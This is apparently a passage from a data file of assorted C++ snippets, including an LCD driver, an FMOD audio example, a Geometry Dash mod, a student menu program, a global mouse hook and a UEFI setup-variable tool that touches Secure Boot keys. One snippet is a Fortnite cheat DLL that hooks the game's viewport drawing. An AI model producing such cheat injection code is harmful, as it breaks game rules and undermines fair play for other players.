wait 50\n\tdelay(50);\n\n\t// Now we pull both RS and R/W low to begin commands\n\texpanderWrite(_backlightval);\t// reset expanderand turn backlight off (Bit 8 =1)\n\tdelay(1000);\n\n\t//put the LCD into 4 bit mode\n\t// this is according to the hitachi HD44780 datasheet\n\t// figure 24, pg 46\n\n\t// we start in 8bit mode, try to set 4 bit mode\n\twrite4bits(0x03 << 4);\n\tdelayMicroseconds(4500); // wait min 4.1ms\n\n\t// second try\n\twrite4bits(0x03 << 4);\n\tdelayMicroseconds(4500); // wait min 4.1ms\n\n\t// third go!\n\twrite4bits(0x03 << 4);\n\tdelayMicroseconds(150);\n\n\t// finally, set to 4-bit interface\n\twrite4bits(0x02 << 4);\n\n\t// set # lines, font size, etc.\n\tcommand(LCD_FUNCTIONSET | _displayfunction);\n\n\t// turn the display on with no cursor or blinking default\n\t_displaycontrol = LCD_DISPLAYON | LCD_CURSOROFF | LCD_BLINKOFF;\n\tdisplay();\n\n\t// clear it off\n\tclear();\n\n\t// Initialize to default text direction (for roman languages)\n\t_displaymode = LCD_ENTRYLEFT | LCD_ENTRYSHIFTDECREMENT;\n\n\t// set the entry mode\n\tcommand(LCD_ENTRYMODESET | _displaymode);\n\n\thome();\n}\n\n/********** high level commands, for the user! */\nvoid LiquidCrystal_I2C::clear(){\n\tcommand(LCD_CLEARDISPLAY);// clear display, set cursor position to zero\n\tdelayMicroseconds(2000);  // this command takes a long time!\n}\n\nvoid LiquidCrystal_I2C::home(){\n\tcommand(LCD_RETURNHOME);  // set cursor position to zero\n\tdelayMicroseconds(2000);  // this command takes a long time!\n}\n\nvoid LiquidCrystal_I2C::setCursor(uint8_t col, uint8_t row){\n\tint row_offsets[] = { 0x00, 0x40, 0x14, 0x54 };\n\tif (row > _rows) {\n\t\trow = _rows-1;    // we count rows starting w/0\n\t}\n\tcommand(LCD_SETDDRAMADDR | (col + row_offsets[row]));\n}\n\n// Turn the display on/off (quickly)\nvoid LiquidCrystal_I2C::noDisplay() {\n\t_displaycontrol &= ~LCD_DISPLAYON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\nvoid LiquidCrystal_I2C::display() {\n\t_displaycontrol |= LCD_DISPLAYON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\n\n// Turns the underline cursor on/off\nvoid LiquidCrystal_I2C::noCursor() {\n\t_displaycontrol &= ~LCD_CURSORON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\nvoid LiquidCrystal_I2C::cursor() {\n\t_displaycontrol |= LCD_CURSORON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\n\n// Turn on and off the blinking cursor\nvoid LiquidCrystal_I2C::noBlink() {\n\t_displaycontrol &= ~LCD_BLINKON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\nvoid LiquidCrystal_I2C::blink() {\n\t_displaycontrol |= LCD_BLINKON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\n\n// These commands scroll the display without changing the RAM\nvoid LiquidCrystal_I2C::scrollDisplayLeft(void) {\n\tcommand(LCD_CURSORSHIFT | LCD_DISPLAYMOVE | LCD_MOVELEFT);\n}\nvoid LiquidCrystal_I2C::scrollDisplayRight(void) {\n\tcommand(LCD_CURSORSHIFT | LCD_DISPLAYMOVE | LCD_MOVERIGHT);\n}\n\n// This is for text that flows Left to Right\nvoid LiquidCrystal_I2C::leftToRight(void) {\n\t_displaymode |= LCD_ENTRYLEFT;\n\tcommand(LCD_ENTRYMODESET | _displaymode);\n}\n\n// This is for text that flows Right to Left\nvoid LiquidCrystal_I2C::rightToLeft(void) {\n\t_displaymode &= ~LCD_ENTRYLEFT;\n\tcommand(LCD_ENTRYMODESET | _displaymode);\n}\n\n// This will 'right justify' text from the cursor\nvoid LiquidCrystal_I2C::autoscroll(void) {\n\t_displaymode |= LCD_ENTRYSHIFTINCREMENT;\n\tcommand(LCD_ENTRYMODESET | _displaymode);\n}\n\n// This will 'left justify' text from the cursor\nvoid LiquidCrystal_I2C::noAutoscroll(void) {\n\t_displaymode &= ~LCD_ENTRYSHIFTINCREMENT;\n\tcommand(LCD_ENTRYMODESET | _displaymode);\n}\n\n// Allows us to fill the first 8 CGRAM locations\n// with custom characters\nvoid LiquidCrystal_I2C::c",
    "#include <Includes.h>\n#include <fstream>\n#include <ostream>\n#include <string>\n\n// this is maybe the worst cheat I've ever made\n\nbool DllMain( void* hModule, int  ul_reason_for_call, void* lpReserved )\n{\n    if ( ul_reason_for_call == DLL_PROCESS_ATTACH )\n    {\n        FortniteClientWin64Shipping = reinterpret_cast< uintptr_t >( GetModuleHandleA( 0 ) );\n\n        SDK::MathLibrary = SDK::UObject::FindObject<SDK::UKismetMathLibrary*>( L\"Engine.Default__KismetMathLibrary\" );\n        SDK::GameplayStatics = SDK::UObject::FindObject<SDK::UGameplayStatics*>( L\"Engine.Default__GameplayStatics\" );\n        SDK::FortLibrary = SDK::UObject::FindObject<SDK::UFortKismetLibrary*>( L\"FortniteGame.Default__FortKismetLibrary\" );\n        SDK::SystemLibrary = SDK::UObject::FindObject<SDK::UKismetSystemLibrary*>( L\"Engine.Default__KismetSystemLibrary\" );\n        SDK::StringLibrary = SDK::UObject::FindObject<SDK::UKismetStringLibrary*>( L\"Engine.Default__KismetStringLibrary\" );\n\n        Implementation::Font = SDK::UObject::FindObject<SDK::UFont*>( L\"Engine/EngineFonts/Roboto.Roboto\" , reinterpret_cast< SDK::UObject* >( -1 ) );\n        Implementation::Player = SDK::UObject::FindObject<SDK::UObject*>( L\"FortniteGame.FortPlayerPawnAthena\" );\n        Implementation::Weapon = SDK::UObject::FindObject<SDK::UObject*>( L\"FortniteGame.FortWeaponRanged\" );\n        Implementation::SupplyDrop = SDK::UObject::FindObject<SDK::UObject*>( L\"FortniteGame.FortAthenaSupplyDrop\" );\n        Implementation::Pickup = SDK::UObject::FindObject<SDK::UObject*>( L\"FortniteGame.FortPickup\" );\n        Implementation::Container = SDK::UObject::FindObject<SDK::UObject*>( L\"FortniteGame.BuildingContainer\" );\n        Implementation::Weakspot = SDK::UObject::FindObject<SDK::UObject*>( L\"FortniteGame.BuildingWeakSpot\" );\n        Implementation::Vehicle = SDK::UObject::FindObject<SDK::UObject*>( L\"FortniteGame.FortAthenaVehicle\" );\n        Implementation::Building = SDK::UObject::FindObject<SDK::UObject*>( L\"FortniteGame.BuildingTrap\" );\n        Implementation::Pickaxe = SDK::UObject::FindObject<SDK::UObject*>( L\"FortniteGame.FortWeaponPickaxeAthena\" );\n        Implementation::Projectile = SDK::UObject::FindObject<SDK::UObject*>( L\"FortniteGame.FortProjectileBase\" );\n\n        Implementation::Material = SDK::UObject::FindObject<SDK::UObject*>( L\"Engine.Material\" );\n        Implementation::LeftShift = SDK::FKey{ SDK::FName{ SDK::StringLibrary->Conv_StringToName( L\"LeftShift\" ) }, 0 };\n        Implementation::F8 = SDK::FKey{ SDK::FName{ SDK::StringLibrary->Conv_StringToName( L\"F8\" ) }, 0 };\n        Implementation::RightMouseButton = SDK::FKey{ SDK::FName{ SDK::StringLibrary->Conv_StringToName( L\"RightMouseButton\" ) }, 0 };\n        Implementation::LeftMouseButton = SDK::FKey{ SDK::FName{ SDK::StringLibrary->Conv_StringToName( L\"LeftMouseButton\" ) }, 0 };\n        Implementation::Insert = SDK::FKey{ SDK::FName{ SDK::StringLibrary->Conv_StringToName( L\"Insert\" ) }, 0 };\n\n        SDK::UWorld* World = SDK::UObject::FindObject<SDK::UWorld*>( L\"Frontend\" , reinterpret_cast< SDK::UObject* >( -1 ) );\n\n        SDK::UGameInstance* OwningGameInstance = World->OwningGameInstance( );\n        SDK::ULocalPlayer* LocalPlayer = OwningGameInstance->LocalPlayers( )[ 0 ];\n        SDK::UGameViewportClient* ViewportClient = LocalPlayer->ViewportClient( );\n\n        ViewportClientHook.Hook( ViewportClient , 114 , DrawTransition , &DrawTransitionOriginal );\n    }\n\n    return true;\n}",
    "/*==============================================================================\nChannel Groups Example\nCopyright (c), Firelight Technologies Pty, Ltd 2004-2024.\n\nThis example shows how to put channels into channel groups, so that you can\naffect a group of channels at a time instead of just one.\n\nFor information on using FMOD example code in your own programs, visit\nhttps://www.fmod.com/legal\n==============================================================================*/\n#include \"fmod.hpp\"\n#include \"common.h\"\n\nint FMOD_Main()\n{\n    FMOD::System       *system;\n    FMOD::Sound        *sound[6];\n    FMOD::Channel      *channel[6];\n    FMOD::ChannelGroup *groupA, *groupB, *masterGroup;\n    FMOD_RESULT         result;\n    int                 count;\n    void               *extradriverdata = 0;\n\n    Common_Init(&extradriverdata);\n\n    /*\n        Create a System object and initialize.\n    */\n    result = FMOD::System_Create(&system);\n    ERRCHECK(result);\n\n    result = system->init(32, FMOD_INIT_NORMAL, extradriverdata);\n    ERRCHECK(result);\n\n    result = system->createSound(Common_MediaPath(\"drumloop.wav\"), FMOD_LOOP_NORMAL, 0, &sound[0]);\n    ERRCHECK(result);\n    result = system->createSound(Common_MediaPath(\"jaguar.wav\"), FMOD_LOOP_NORMAL, 0, &sound[1]);\n    ERRCHECK(result);\n    result = system->createSound(Common_MediaPath(\"swish.wav\"), FMOD_LOOP_NORMAL, 0, &sound[2]);\n    ERRCHECK(result);\n    result = system->createSound(Common_MediaPath(\"c.ogg\"), FMOD_LOOP_NORMAL, 0, &sound[3]);\n    ERRCHECK(result);\n    result = system->createSound(Common_MediaPath(\"d.ogg\"), FMOD_LOOP_NORMAL, 0, &sound[4]);\n    ERRCHECK(result);\n    result = system->createSound(Common_MediaPath(\"e.ogg\"), FMOD_LOOP_NORMAL, 0, &sound[5]);\n    ERRCHECK(result);\n\n    result = system->createChannelGroup(\"Group A\", &groupA);\n    ERRCHECK(result);\n    result = system->createChannelGroup(\"Group B\", &groupB);\n    ERRCHECK(result);\n\n    result = system->getMasterChannelGroup(&masterGroup);\n    ERRCHECK(result);\n\n    /*\n        Instead of being independent, set the group A and B to be children of the master group.\n    */\n    result = masterGroup->addGroup(groupA);\n    ERRCHECK(result);\n\n    result = masterGroup->addGroup(groupB);\n    ERRCHECK(result);\n\n    /*\n        Start all the sounds.\n    */\n    for (count = 0; count < 6; count++)\n    {\n        result = system->playSound(sound[count], 0, true, &channel[count]);\n        ERRCHECK(result);\n        \n        result = channel[count]->setChannelGroup((count < 3) ? groupA : groupB);\n        ERRCHECK(result);\n        \n        result = channel[count]->setPaused(false);\n        ERRCHECK(result);\n    }   \n\n    /*\n        Change the volume of each group, just because we can! (reduce overall noise).\n    */\n    result = groupA->setVolume(0.5f);\n    ERRCHECK(result);\n    result = groupB->setVolume(0.5f);\n    ERRCHECK(result);\n\n    /*\n        Main loop.\n    */\n    do\n    {\n        Common_Update();\n\n        if (Common_BtnPress(BTN_ACTION1))\n        {\n            bool mute = true;\n            groupA->getMute(&mute);\n            groupA->setMute(!mute);\n        }\n\n        if (Common_BtnPress(BTN_ACTION2))\n        {\n            bool mute = true;\n            groupB->getMute(&mute);\n            groupB->setMute(!mute);\n        }\n\n        if (Common_BtnPress(BTN_ACTION3))\n        {\n            bool mute = true;\n            masterGroup->getMute(&mute);\n            masterGroup->setMute(!mute);\n        }\n\n        result = system->update();\n        ERRCHECK(result);\n\n        {\n            int channelsplaying = 0;\n\n            result = system->getChannelsPlaying(&channelsplaying, NULL);\n            ERRCHECK(result);\n\n            Common_Draw(\"==================================================\");\n            Common_Draw(\"Channel Groups Example.\");\n            Common_Draw(\"Copyright (c) Firelight Technologies 2004-2024.\");\n            Common_Draw(\"==================================================\");\n            Common_Draw(\"\");\n            Common_Draw(\"Group A : drumloop.wav, jaguar.wav, swish.wav\");\n            Common_Draw(\"Group B : c.ogg, d.ogg, e.ogg\");\n            Common_Draw(\"\");\n            Common_Draw(\"Press %s to mute/unmute group A\", Common_BtnStr(BTN_ACTION1));\n            Common_Draw(\"Press %s to mute/unmute group B\", Common_BtnStr(BTN_ACTION2));\n            Common_Draw(\"Press %s to mute/unmute master group\", Common_BtnStr(BTN_ACTION3));\n            Common_Draw(\"Press %s to quit\", Common_BtnStr(BTN_QUIT));\n            Common_Draw(\"\");\n            Common_Draw(\"Channels playing %d\", channelsplaying);\n        }\n\n        Common_Sleep(50);\n    } while (!Common_BtnPress(BTN_QUIT));\n\n\n    /*\n        A little fade out over 2 seconds.\n    */\n    {\n        float pitch = 1.0f;\n        float vol = 1.0f;\n\n        for (count = 0; count < 200; count++)\n        {\n            masterGroup->setPitch(pitch);\n            masterGroup->setVolume(vol);\n\n            vol   -= (1.0f / 200.0f);\n            pitch -= (0.5f / 200.0f);\n\n       ",
    "#include <Geode/DefaultInclude.hpp>\r\n#include <Geode/binding/GJGameLevel.hpp>\r\n#include <Geode/modify/GameLevelManager.hpp>\r\n#include <Geode/modify/LevelBrowserLayer.hpp>\r\n#include <Geode/modify/EditLevelLayer.hpp>\r\n#include <Geode/modify/MenuLayer.hpp>\r\n#include <Geode/utils/cocos.hpp>\r\n#include <Geode/loader/Dirs.hpp>\r\n#include \"Trashed.hpp\"\r\n#include \"TrashcanPopup.hpp\"\r\n\r\nusing namespace geode::prelude;\r\n\r\nstruct $modify(GameLevelManager) {\r\n\t$override\r\n\tvoid deleteLevel(GJGameLevel* level) {\r\n\t\tif (level->m_levelType == GJLevelType::Editor) {\r\n\t\t\tauto res = Trashed::trash(level);\r\n\t\t\tif (!res) {\r\n\t\t\t\tFLAlertLayer::create(\r\n\t\t\t\t\t\"Error Trashing Level\",\r\n\t\t\t\t\tfmt::format(\"Unable to move level to trash: {}\", res.unwrapErr()),\r\n\t\t\t\t\t\"OK\"\r\n\t\t\t\t)->show();\r\n\t\t\t}\r\n\t\t\treturn;\r\n\t\t}\r\n\t\tGameLevelManager::deleteLevel(level);\r\n\t}\r\n\t$override\r\n\tvoid deleteLevelList(GJLevelList* list) {\r\n\t\tif (list->m_listType == GJLevelType::Editor) {\r\n\t\t\tauto res = Trashed::trash(list);\r\n\t\t\tif (!res) {\r\n\t\t\t\tFLAlertLayer::create(\r\n\t\t\t\t\t\"Error Trashing List\",\r\n\t\t\t\t\tfmt::format(\"Unable to move list to trash: {}\", res.unwrapErr()),\r\n\t\t\t\t\t\"OK\"\r\n\t\t\t\t)->show();\r\n\t\t\t}\r\n\t\t\treturn;\r\n\t\t}\r\n\t\tGameLevelManager::deleteLevelList(list);\r\n\t}\r\n};\r\n\r\nclass $modify(TrashBrowserLayer, LevelBrowserLayer) {\r\n    struct Fields {\r\n        EventListener<EventFilter<UpdateTrashEvent>> listener;\r\n    };\r\n\r\n\t$override\r\n    bool init(GJSearchObject* search) {\r\n        if (!LevelBrowserLayer::init(search))\r\n            return false;\r\n        \r\n        if (search->m_searchType == SearchType::MyLevels) {\r\n            if (auto menu = this->getChildByID(\"my-levels-menu\")) {\r\n                auto trashSpr = CCSprite::createWithSpriteFrameName(\"GJ_trashBtn_001.png\");\r\n                auto trashBtn = CCMenuItemSpriteExtra::create(\r\n                    trashSpr, this, menu_selector(TrashBrowserLayer::onTrashcan)\r\n                );\r\n                menu->addChild(trashBtn);\r\n                menu->updateLayout();\r\n\r\n                auto updateTrashSprite = [trashSpr] {\r\n                    std::error_code ec;\r\n                    auto finnsTrashed = !std::filesystem::is_empty(getTrashDir(), ec) && !ec;\r\n                    trashSpr->setOpacity(finnsTrashed ? 255 : 205);\r\n                    trashSpr->setColor(finnsTrashed ? ccWHITE : ccc3(90, 90, 90));\r\n                };\r\n                m_fields->listener.bind([=, this](auto*) {\r\n                    updateTrashSprite();\r\n                    // Reload levels list\r\n                    this->loadPage(m_searchObject);\r\n                    return ListenerResult::Propagate;\r\n                });\r\n                updateTrashSprite();\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n    void onTrashcan(CCObject*) {\r\n        std::error_code ec;\r\n        auto finnsTrashed = !std::filesystem::is_empty(getTrashDir(), ec) && !ec;\r\n        if (finnsTrashed) {\r\n            TrashcanPopup::create()->show();\r\n        }\r\n        else {\r\n            FLAlertLayer::create(\r\n                \"Trash is Empty\",\r\n                \"You have not <co>trashed</c> any levels!\",\r\n                \"OK\"\r\n\t\t    )->show();\r\n        }\r\n    }\r\n};\r\n\r\nclass $modify(EditLevelLayer) {\r\n\t$override\r\n    void confirmDelete(CCObject*) {\r\n        auto alert = FLAlertLayer::create(\r\n            this,\r\n            \"Trash level\", \r\n            \"Are you sure you want to <cr>trash</c> this level?\\n\"\r\n            \"<cy>You can restore the level or permanently delete it through the Trashcan.</c>\",\r\n            \"Cancel\", \"Trash\",\r\n            340\r\n        );\r\n        alert->setTag(4);\r\n\t\talert->m_button2->updateBGImage(\"GJ_button_06.png\");\r\n        alert->show();\r\n    }\r\n};\r\nclass $modify(LevelBrowserLayer) {\r\n\t$override\r\n    void onDeleteSelected(CCObject* sender) {\r\n\t\tif (m_searchObject->m_searchType == SearchType::MyLevels) {\r\n\t\t\tsize_t count = 0;\r\n\t\t\tfor (auto level : CCArrayExt<GJGameLevel*>(m_levels)) {\r\n\t\t\t\tif (level->m_selected) {\r\n\t\t\t\t\tcount += 1;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tif (count > 0) {\r\n\t\t\t\tauto alert = FLAlertLayer::create(\r\n\t\t\t\t\tthis,\r\n\t\t\t\t\t\"Trash levels\", \r\n\t\t\t\t\tfmt::format(\r\n\t\t\t\t\t\t\"Are you sure you want to <cr>trash</c> the <cp>{0}</c> selected level{1}?\\n\"\r\n\t\t\t\t\t\t\"<cy>You can restore the level{1} or permanently delete {2} through the Trashcan.</c>\",\r\n\t\t\t\t\t\tcount, (count == 1 ? \"\" : \"s\"), (count == 1 ? \"it\" : \"them\")\r\n\t\t\t\t\t),\r\n\t\t\t\t\t\"Cancel\", \"Trash\",\r\n\t\t\t\t\t340\r\n\t\t\t\t);\r\n\t\t\t\talert->setTag(5);\r\n\t\t\t\talert->m_button2->updateBGImage(\"GJ_button_06.png\");\r\n\t\t\t\talert->show();\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tFLAlertLayer::create(\"Nothing here...\", \"No levels selected.\", \"OK\")->show();\r\n\t\t\t}\r\n\t\t}\r\n\t\telse {\r\n\t\t\treturn LevelBrowserLayer::onDeleteSelected(sender);\r\n\t\t}\r\n    }\r\n};\r\nclass $modify(MenuLayer) {\r\n\tbool init() {\r\n\t\tif (!MenuLayer::init())\r\n\t\t\treturn false;\r\n\t\t\r\n\t\tTrashed::recoverAll();\r\n\r\n\t\treturn true;\r\n\t}\r\n};\r\n",
    "/*\r\n* Robert Dickens\r\n* 6/23/2024\r\n* CS 210\r\n* Project Three\r\n*/\r\n\r\n// Create data file\r\n// Menu\r\n\r\n\r\n\r\n\r\n\r\n#include \"Grocer.h\"\r\n#include <iostream>\r\nusing namespace std;\r\n\r\nint main() {\r\n\tGrocer storeData;\r\n\tbool repeat = true;\r\n\tint options;\r\n\r\n\tcout << \"Corner Grocer Item Tracker\" << endl;\r\n\tcout << \"----------------------------------------\" << endl;\r\n\r\n\twhile (repeat) {\r\n\t\tcout << \"1. Search frequency of a single item.\" << endl;\r\n\t\tcout << \"2. List frequencies of all items.\" << endl;\r\n\t\tcout << \"3. Print Histogram of item frequencies.\" << endl;\r\n\t\tcout << \"4. Exit Program.\" << endl;\r\n\t\tcout << \"----------------------------------------\" << endl;\r\n\t\tcout << \"Input choice: \";\r\n\t\tcin >> options;\r\n\t\tif (options == 1) { //Op1: Input item, Print Word Frequency\r\n\t\t\tstoreData.PrintSingleFrequency();\r\n\t\t}\r\n\t\telse if (options == 2) { //Op2: Print Frequency of all items purchased from file\r\n\t\t\tstoreData.PrintAllFrequencies();\r\n\t\t}\r\n\t\telse if (options == 3) { //Op3: Print same frequency as histogram\r\n\t\t\tstoreData.PrintAllFrequenciesHistogram();\r\n\t\t}\r\n\t\telse if (options == 4) { //Op4: Exit Program\r\n\t\t\trepeat = false;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tcout << \"Input invalid. Please try again.\" << endl;\r\n\t\t}\r\n\t\tcout << endl;\r\n\t}\r\n\r\n\treturn -1;\r\n}",
    "#include <windows.h>\n#include <oleacc.h>\n#include <psapi.h>\n#include <iostream>\n#include <string>\n\n#pragma comment(lib, \"Oleacc.lib\")\n#pragma comment(lib, \"Psapi.lib\")\n\n// Global hook handle\nHHOOK hMouseHook = NULL;\n\n// Function prototypes\nstd::string ConvertWStringToString(const std::wstring& wstr);\nstd::string GetProcessName(HWND hwnd);\nstd::string GetAccessibleRole(IAccessible* pAcc, VARIANT varChild);\nLRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam);\nvoid SetMouseHook();\nvoid UnhookMouse();\n\n// Helper function to convert wstring to string\nstd::string ConvertWStringToString(const std::wstring& wstr) {\n    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);\n    std::string str(bufferSize, 0);\n    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], bufferSize, nullptr, nullptr);\n    return str;\n}\n\n// Helper function to get the process name by HWND\nstd::string GetProcessName(HWND hwnd) {\n    DWORD processId;\n    GetWindowThreadProcessId(hwnd, &processId);\n    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);\n    if (hProcess) {\n        TCHAR exeName[MAX_PATH];\n        if (GetModuleFileNameEx(hProcess, NULL, exeName, MAX_PATH)) {\n            CloseHandle(hProcess);\n            std::wstring exeWStr = exeName;\n            std::string exeStr = ConvertWStringToString(exeWStr);\n            size_t pos = exeStr.find_last_of(\"\\\\/\");\n            return (pos != std::string::npos) ? exeStr.substr(pos + 1) : exeStr;\n        }\n        CloseHandle(hProcess);\n    }\n    return \"unknown.exe\";\n}\n\n// Helper function to get the role of the accessible object\nstd::string GetAccessibleRole(IAccessible* pAcc, VARIANT varChild) {\n    VARIANT varRole;\n    VariantInit(&varRole);\n    if (pAcc!=NULL && pAcc->get_accRole(varChild, &varRole) == S_OK) {\n        if (varRole.vt == VT_I4) {\n            switch (varRole.lVal) {\n            case 8: return \"alert\";            // ROLE_SYSTEM_ALERT\n            case 43: return \"button\";          // ROLE_SYSTEM_BUTTON\n            case 44: return \"check box\";       // ROLE_SYSTEM_CHECKBUTTON\n            case 46: return \"combo box\";       // ROLE_SYSTEM_COMBOBOX\n            case 15: return \"document\";        // ROLE_SYSTEM_DOCUMENT\n            case 30: return \"hyperlink\";       // ROLE_SYSTEM_LINK\n            case 34: return \"list\";            // ROLE_SYSTEM_LIST\n            case 35: return \"list item\";       // ROLE_SYSTEM_LISTITEM\n            case 45: return \"menu item\";       // ROLE_SYSTEM_MENUITEM\n            case 48: return \"progress bar\";    // ROLE_SYSTEM_PROGRESSBAR\n            case 50: return \"radio button\";    // ROLE_SYSTEM_RADIOBUTTON\n            case 53: return \"scroll bar\";      // ROLE_SYSTEM_SCROLLBAR\n            case 21: return \"separator\";       // ROLE_SYSTEM_SEPARATOR\n            case 52: return \"slider\";          // ROLE_SYSTEM_SLIDER\n            case 54: return \"spin box\";        // ROLE_SYSTEM_SPINBUTTON\n            case 41: return \"static text\";     // ROLE_SYSTEM_STATICTEXT\n            case 37: return \"tab\";             // ROLE_SYSTEM_TAB\n            case 38: return \"table\";           // ROLE_SYSTEM_TABLE\n            case 42: return \"text box\";        // ROLE_SYSTEM_TEXT\n            case 1: return \"title bar\";        // ROLE_SYSTEM_TITLEBAR\n            case 10: return \"client\";          // ROLE_SYSTEM_CLIENT\n            default: return \"unknown role\";\n            }\n        }\n    }\n    VariantClear(&varRole);\n    return \"unknown role\";\n}\n\n// Function to get the IAccessible object at the cursor position\nIAccessible* GetAccessibleObjectFromPoint(POINT pt, VARIANT* pVarChild) {\n    IAccessible* pAcc = nullptr;\n    HRESULT hr = AccessibleObjectFromPoint(pt, &pAcc, pVarChild);\n    if (SUCCEEDED(hr)) {\n        return pAcc;\n    }\n    return nullptr;\n}\n\n// Hook procedure (callback function)\nLRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {\n    if (nCode == HC_ACTION) {\n        MSLLHOOKSTRUCT* pMouseStruct = (MSLLHOOKSTRUCT*)lParam;\n        if (pMouseStruct != nullptr) {\n            if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {\n                POINT pt = pMouseStruct->pt;\n                HWND hwnd = WindowFromPoint(pt);\n                std::string processName = GetProcessName(hwnd);\n\n                VARIANT varChild;\n                IAccessible* pAcc = GetAccessibleObjectFromPoint(pt, &varChild);\n                std::string elementType = GetAccessibleRole(pAcc, varChild);\n                if (pAcc) {\n                    pAcc->Release();  // Release the IAccessible object\n                }\n\n                std::cout << processName << \": {X=\" << pt.x << \", Y=\" << pt.y << \"}: \" << elementType << std::endl;\n            }\n        }\n    }\n    return CallNextHookEx(hMouseHook, nCode, wParam, lParam);\n}\n\n// Function to set the mouse hook\nvoid SetMouseHook() {\n    hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, GetModule",
    "#include \"SetupVar.h\"\r\n\r\nbool SetPrivilege(HANDLE HandleToken, LPCTSTR LpszPrivilege, BOOL EnablePrivilege) {\r\n\r\n    TOKEN_PRIVILEGES TokenPrivileges;\r\n    LUID Luid;\r\n\r\n    if (!LookupPrivilegeValue(nullptr, LpszPrivilege, &Luid)) {\r\n        printf(\"LookupPrivilegeValue error: %lu.\\n\", GetLastError());\r\n        return false;\r\n    }\r\n\r\n    TokenPrivileges.PrivilegeCount = 1;\r\n    TokenPrivileges.Privileges[0].Luid = Luid;\r\n\r\n    if (EnablePrivilege) {\r\n        TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\r\n    }\r\n    else {\r\n        TokenPrivileges.Privileges[0].Attributes = 0;\r\n    }\r\n\r\n    if (!AdjustTokenPrivileges(HandleToken, false, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {\r\n        printf(\"AdjustTokenPrivileges error: %lu.\\n\", GetLastError());\r\n        return false;\r\n    }\r\n\r\n    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {\r\n        printf(\"The token does not have the specified privilege.\\n\");\r\n        return false;\r\n    }\r\n\r\n    return true;\r\n\r\n}\r\n\r\nvoid RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {\r\n\r\n    if (SourceString) {\r\n        DestinationString->Buffer = const_cast<PWSTR>(SourceString);\r\n        DestinationString->Length = static_cast<USHORT>(wcslen(SourceString) * sizeof(WCHAR));\r\n        DestinationString->MaximumLength = DestinationString->Length + sizeof(WCHAR);\r\n    }\r\n    else {\r\n        DestinationString->Buffer = nullptr;\r\n        DestinationString->Length = 0;\r\n        DestinationString->MaximumLength = 0;\r\n    }\r\n\r\n    return;\r\n\r\n}\r\n\r\nstd::wstring GuidToString(GUID Guid) {\r\n    wchar_t Buffer[39];\r\n\r\n    swprintf(Buffer, sizeof(Buffer) / sizeof(Buffer[0]),\r\n        L\"%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X\",\r\n        Guid.Data1, Guid.Data2, Guid.Data3,\r\n        Guid.Data4[0], Guid.Data4[1],\r\n        Guid.Data4[2], Guid.Data4[3],\r\n        Guid.Data4[4], Guid.Data4[5],\r\n        Guid.Data4[6], Guid.Data4[7]);\r\n\r\n    return std::wstring(Buffer);\r\n}\r\n\r\nstd::wstring StringToWString(const std::string& Str) {\r\n    if (Str.empty()) return L\"\";\r\n    int SizeNeeded = MultiByteToWideChar(CP_UTF8, 0, Str.c_str(), -1, nullptr, 0);\r\n    std::wstring Wstr(SizeNeeded, 0);\r\n    MultiByteToWideChar(CP_UTF8, 0, Str.c_str(), -1, &Wstr[0], SizeNeeded);\r\n    return Wstr;\r\n}\r\n\r\nbool InitializeVariable(const char* Argument, std::wstring& VariableCharName, GUID& VariableGuid) {\r\n    std::string VariableCharNameStr;\r\n\r\n    if (strcmp(Argument, \"-AmiSetup\") == 0) {\r\n        VariableCharNameStr = \"Setup\";\r\n        VariableGuid = gEfiAmiSetupVariableGuid;\r\n    }\r\n    else if (strcmp(Argument, \"-InsydeSetup\") == 0) {\r\n        VariableCharNameStr = \"Setup\";\r\n        VariableGuid = gEfiInsydeH2OSetupVariableGuid;\r\n    }\r\n    else if (strcmp(Argument, \"-PchSetup\") == 0) {\r\n        VariableCharNameStr = \"PchSetup\";\r\n        VariableGuid = gEfiPchSetupVariableGuid;\r\n    }\r\n    else if (strcmp(Argument, \"-SaSetup\") == 0) {\r\n        VariableCharNameStr = \"SaSetup\";\r\n        VariableGuid = gEfiSaSetupVariableGuid;\r\n    }\r\n    else if (strcmp(Argument, \"-CpuSetup\") == 0) {\r\n        VariableCharNameStr = \"CpuSetup\";\r\n        VariableGuid = gEfiCpuSetupVariableGuid;\r\n    }\r\n    else if (strcmp(Argument, \"-IntelSetup\") == 0) {\r\n        VariableCharNameStr = \"IntelSetup\";\r\n        VariableGuid = gEfiIntelSetupVariableGuid;\r\n    }\r\n    else if (strcmp(Argument, \"-SystemConfig\") == 0) {\r\n        VariableCharNameStr = \"SystemConfig\";\r\n        VariableGuid = gEfiSystemConfigVariableGuid;\r\n    }\r\n    else if (strcmp(Argument, \"-AmiKek\") == 0) {\r\n        VariableCharNameStr = \"KEK\";\r\n        VariableGuid = gEfiAmiKekVariableGuid;\r\n    }\r\n    else if (strcmp(Argument, \"-AmiPk\") == 0) {\r\n        VariableCharNameStr = \"PK\";\r\n        VariableGuid = gEfiAmiPkVariableGuid;\r\n    }\r\n    else {\r\n        return false;\r\n    }\r\n\r\n    VariableCharName = StringToWString(VariableCharNameStr);\r\n    return 